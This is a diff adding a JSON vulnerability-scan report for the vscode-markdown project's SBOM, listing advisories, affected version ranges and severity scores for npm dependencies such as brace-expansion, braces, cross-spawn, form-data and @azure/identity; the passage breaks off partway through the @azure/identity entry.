@@ -1,0 +1,3513 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "/sboms/yzhang-gh__vscode-markdown.spdx.json",
+        "type": "sbom"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "brace-expansion",
+            "version": "1.1.11",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-v6h2-p8h4-qcjw"
+              ],
+              "aliases": [
+                "CVE-2025-5889",
+                "GHSA-v6h2-p8h4-qcjw"
+              ],
+              "max_severity": "3.1"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 2.0.1",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "brace-expansion",
+                    "purl": "pkg:npm/brace-expansion"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.0.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 1.1.11",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "brace-expansion",
+                    "purl": "pkg:npm/brace-expansion"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.0.0"
+                        },
+                        {
+                          "fixed": "1.1.12"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "brace-expansion",
+                    "purl": "pkg:npm/brace-expansion"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ],
+                  "versions": [
+                    "3.0.0"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v6h2-p8h4-qcjw/GHSA-v6h2-p8h4-qcjw.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "brace-expansion",
+                    "purl": "pkg:npm/brace-expansion"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ],
+                  "versions": [
+                    "4.0.0"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-5889"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-06-10T22:51:59Z",
+                "nvd_published_at": "2025-06-09T19:15:25Z",
+                "severity": "LOW"
+              },
+              "details": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+              "id": "GHSA-v6h2-p8h4-qcjw",
+              "modified": "2025-06-11T20:54:10Z",
+              "published": "2025-06-09T21:30:51Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5889"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/juliangruber/brace-expansion"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://vuldb.com/?ctiid.311660"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://vuldb.com/?id.311660"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://vuldb.com/?submit.585717"
+                }
+              ],
+              "related": [
+                "CGA-48f6-2xrx-cxvw",
+                "CGA-53f7-rx58-5rx6",
+                "CGA-5489-g42r-jj95",
+                "CGA-6q97-x38p-2v36",
+                "CGA-8v3m-9726-pcqj",
+                "CGA-9w98-92pm-h3wg",
+                "CGA-gwp3-55v6-p25f",
+                "CGA-hvx5-j33w-wf72",
+                "CGA-jq8h-hpf9-qxxv",
+                "CGA-jv3c-567r-7fr7",
+                "CGA-mvmv-c4pf-vgpr",
+                "CGA-p2f9-h939-jv5f",
+                "CGA-vr9h-m8qm-5mj9",
+                "CGA-x49c-f2g9-2gqg",
+                "CGA-x9mj-gpvv-mx29",
+                "CGA-xc8g-m7h6-2rp6",
+                "CGA-xqvv-5w52-gqqq"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "brace-expansion Regular Expression Denial of Service vulnerability"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "braces",
+            "version": "3.0.2",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-grv7-fg5c-xmjg"
+              ],
+              "aliases": [
+                "CVE-2024-4068",
+                "GHSA-grv7-fg5c-xmjg"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-grv7-fg5c-xmjg/GHSA-grv7-fg5c-xmjg.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "braces",
+                    "purl": "pkg:npm/braces"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.0.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-4068"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1050",
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-10T20:17:26Z",
+                "nvd_published_at": "2024-05-14T15:42:48Z",
+                "severity": "HIGH"
+              },
+              "details": "The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n",
+              "id": "GHSA-grv7-fg5c-xmjg",
+              "modified": "2024-07-15T22:12:28.795792Z",
+              "published": "2024-05-14T18:30:54Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4068"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/issues/35"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/pull/37"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/pull/40"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4068"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/micromatch/braces"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308"
+                }
+              ],
+              "related": [
+                "CGA-g3x5-7mr7-wr8m",
+                "CGA-hq78-8245-675v",
+                "CGA-jrqh-c82g-rxvm",
+                "CGA-p4gw-wx75-2mg4",
+                "CGA-w95g-rrw2-66h4",
+                "CGA-wr9w-hw24-rqg5"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Uncontrolled resource consumption in braces"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "cross-spawn",
+            "version": "7.0.3",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-3xgq-45jj-v275"
+              ],
+              "aliases": [
+                "CVE-2024-21538",
+                "GHSA-3xgq-45jj-v275"
+              ],
+              "max_severity": "7.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-3xgq-45jj-v275/GHSA-3xgq-45jj-v275.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "cross-spawn",
+                    "purl": "pkg:npm/cross-spawn"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "7.0.0"
+                        },
+                        {
+                          "fixed": "7.0.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-3xgq-45jj-v275/GHSA-3xgq-45jj-v275.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "cross-spawn",
+                    "purl": "pkg:npm/cross-spawn"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "6.0.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-21538"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-11-15T22:25:53Z",
+                "nvd_published_at": "2024-11-08T05:15:06Z",
+                "severity": "HIGH"
+              },
+              "details": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
+              "id": "GHSA-3xgq-45jj-v275",
+              "modified": "2025-05-19T19:56:26Z",
+              "published": "2024-11-08T06:30:47Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21538"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/moxystudio/node-cross-spawn/issues/165"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/moxystudio/node-cross-spawn/pull/160"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/moxystudio/node-cross-spawn"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230"
+                }
+              ],
+              "related": [
+                "CGA-3wmj-q542-x56g",
+                "CGA-49x5-fp72-pvgg",
+                "CGA-56f7-wq2j-gqhc",
+                "CGA-58mw-hm95-x9xv",
+                "CGA-7c7p-r8cv-2pj4",
+                "CGA-8hpc-g49m-34cc",
+                "CGA-8j64-28x2-ggxv",
+                "CGA-8rv2-6965-grc6",
+                "CGA-m347-mh8c-rhf4"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Regular Expression Denial of Service (ReDoS) in cross-spawn"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "form-data",
+            "version": "4.0.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-fjxv-7rqg-78g4"
+              ],
+              "aliases": [
+                "CVE-2025-7783",
+                "GHSA-fjxv-7rqg-78g4"
+              ],
+              "max_severity": "9.4"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.5.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.0.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.0.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-7783"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-330"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-07-21T19:04:54Z",
+                "nvd_published_at": "2025-07-18T17:15:44Z",
+                "severity": "CRITICAL"
+              },
+              "details": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+              "id": "GHSA-fjxv-7rqg-78g4",
+              "modified": "2025-11-03T21:34:08Z",
+              "published": "2025-07-21T19:04:54Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-7783"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/benweissmann/CVE-2025-7783-poc"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/form-data/form-data"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/07/msg00023.html"
+                }
+              ],
+              "related": [
+                "CGA-35hh-78jw-8mmq",
+                "CGA-9m6x-qcrx-9xfj",
+                "CGA-cvhq-qgx3-vfx9",
+                "CGA-g2fp-rgfq-2hjj",
+                "CGA-h6v7-23w8-2vw8",
+                "CGA-mp9r-pq3p-q3qc",
+                "CGA-pgwm-362h-3mjh",
+                "CGA-qvfw-fcfj-g5xq",
+                "CGA-rvcj-gcgm-25q3",
+                "CGA-xvgg-cqm9-vxh5",
+                "CVE-2025-7783"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "form-data uses unsafe random function in form-data for choosing boundary"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "@azure/identity",
+            "version": "4.1.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-m5vv-6r4h-3vj9"
+              ],
+              "aliases": [
+                "CVE-2024-35255",
+                "GHSA-m5vv-6r4h-3vj9",
+                "GO-2024-2918"
+              ],
+              "max_severity": "6.8"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "azure-identity",
+                    "purl": "pkg:pypi/azure-identity"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.1"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.0.0",
+                    "1.0.0b1",
+                    "1.0.0b2",
+                    "1.0.0b3",
+                    "1.0.0b4",
+                    "1.0.1",
+                    "1.1.0",
+                    "1.10.0",
+                    "1.10.0b1",
+                    "1.11.0",
+                    "1.11.0b1",
+                    "1.11.0b2",
+                    "1.11.0b3",
+                    "1.12.0",
+                    "1.12.0b1",
+                    "1.12.0b2",
+                    "1.13.0",
+                    "1.13.0b1",
+                    "1.13.0b2",
+                    "1.13.0b3",
+                    "1.13.0b4",
+                    "1.14.0",
+                    "1.14.0b1",
+                    "1.14.0b2",
+                    "1.14.1",
+                    "1.15.0",
+                    "1.15.0b1",
+                    "1.15.0b2",
+                    "1.16.0",
+                    "1.16.0b1",
+                    "1.16.0b2",
+                    "1.2.0",
+                    "1.3.0",
+                    "1.3.1",
+                    "1.4.0",
+                    "1.4.0b1",
+                    "1.4.0b2",
+                    "1.4.0b3",
+                    "1.4.0b4",
+                    "1.4.0b5",
+                    "1.4.0b6",
+                    "1.4.0b7",
+                    "1.4.1",
+                    "1.5.0",
+                    "1.5.0b1",
+                    "1.5.0b2",
+                    "1.6.0",
+                    "1.6.0b1",
+                    "1.6.0b2",
+                    "1.6.0b3",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.7.0b1",
+                    "1.7.0b2",
+                    "1.7.0b3",
+                    "1.7.0b4",
+                    "1.7.1",
+                    "1.8.0",
+                    "1.8.0b1",
+                    "1.9.0",
+                    "1.9.0b1"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@azure/identity",
+                    "purl": "pkg:npm/%40azure/identity"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.2.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "Maven",
+                    "name": "com.azure:azure-identity",
+                    "purl": "pkg:maven/com.azure/azure-identity"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.12.2"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.0.0",
+                    "1.0.0-preview.1",
+                    "1.0.0-preview.2",
+                    "1.0.0-preview.3",
+                    "1.0.0-preview.4",
+                    "1.0.0-preview.5",
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0.3",
+                    "1.0.4",
+                    "1.0.5",
+                    "1.0.6",
+                    "1.0.7",
+                    "1.0.8",
+                    "1.0.9",
+                    "1.1.0",
+                    "1.1.0-beta.1",
+                    "1.1.0-beta.2",
+                    "1.1.0-beta.3",
+                    "1.1.0-beta.4",
+                    "1.1.0-beta.5",
+                    "1.1.0-beta.6",
+                    "1.1.0-beta.7",
+                    "1.1.1",
+                    "1.1.2",
+                    "1.1.3",
+                    "1.10.0",
+                    "1.10.0-beta.1",
+                    "1.10.1",
+                    "1.10.2",
+                    "1.10.3",
+                    "1.10.4",
+                    "1.11.0",
+                    "1.11.0-beta.1",
+                    "1.11.0-beta.2",
+                    "1.11.1",
+                    "1.11.2",
+                    "1.11.3",
+                    "1.11.4",
+                    "1.12.0",
+                    "1.12.0-beta.1",
+                    "1.12.1",
+                    "1.2.0",
+                    "1.2.0-beta.1",
+                    "1.2.0-beta.2",
+                    "1.2.1",
+                    "1.2.2",
+                    "1.2.3",
+                    "1.2.4",
+                    "1.2.5",
+                    "1.3.0",
+                    "1.3.0-beta.1",
+                    "1.3.0-beta.2",
+                    "1.3.1",
+                    "1.3.2",
+                    "1.3.3",
+                    "1.3.4",
+                    "1.3.5",
+                    "1.3.6",
+                    "1.3.7",
+                    "1.4.0",
+                    "1.4.0-beta.1",
+                    "1.4.1",
+                    "1.4.2",
+                    "1.4.3",
+                    "1.4.4",
+                    "1.4.5",
+                    "1.4.6",
+                    "1.5.0",
+                    "1.5.0-beta.1",
+                    "1.5.0-beta.2",
+                    "1.5.1",
+                    "1.5.2",
+                    "1.5.3",
+                    "1.5.4",
+                    "1.5.5",
+                    "1.6.0",
+                    "1.6.0-beta.1",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.7.0-beta.1",
+                    "1.7.0-beta.2",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.8.0",
+                    "1.8.0-beta.1",
+                    "1.8.1",
+                    "1.8.2",
+                    "1.8.3",
+                    "1.9.0",
+                    "1.9.0-beta.1",
+                    "1.9.0-beta.2",
+                    "1.9.0-beta.3",
+                    "1.9.1",
+                    "1.9.2"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@azure/msal-node",
+                    "purl": "pkg:npm/%40azure/msal-node"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.7.0"
+                        },
+                        {
+                          "fixed": "2.9.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "NuGet",
+                    "name": "Microsoft.Identity.Client",
+                    "purl": "pkg:nuget/Microsoft.Identity.Client"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.49.1"
+                        },
+                        {
+                          "fixed": "4.60.4"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "4.49.1",
+                    "4.50.0",
+                    "4.51.0",
+                    "4.52.0",
+                    "4.53.0",
+                    "4.54.0",
+                    "4.54.1",
+                    "4.55.0",
+                    "4.55.0-TestPackage",
+                    "4.56.0",
+                    "4.57.0",
+                    "4.58.0",
+                    "4.58.1",
+                    "4.59.0",
+                    "4.59.1",
+                    "4.60.0",
+                    "4.60.0-netonly",
+                    "4.60.1",
+                    "4.60.2",
+                    "4.60.3"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/Azure/azure-sdk-for-go/sdk/azidentity",
+                    "purl": "pkg:golang/github.com/Azure/azure-sdk-for-go/sdk/azidentity"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.6.0-beta.4.0.20240610221955-50774cd97099"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "Maven",
+                    "name": "com.microsoft.azure:msal4j",
+                    "purl": "pkg:maven/com.microsoft.azure/msal4j"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.14.4-beta"
+                        },
+                        {
+                          "fixed": "1.15.1"
+                        }
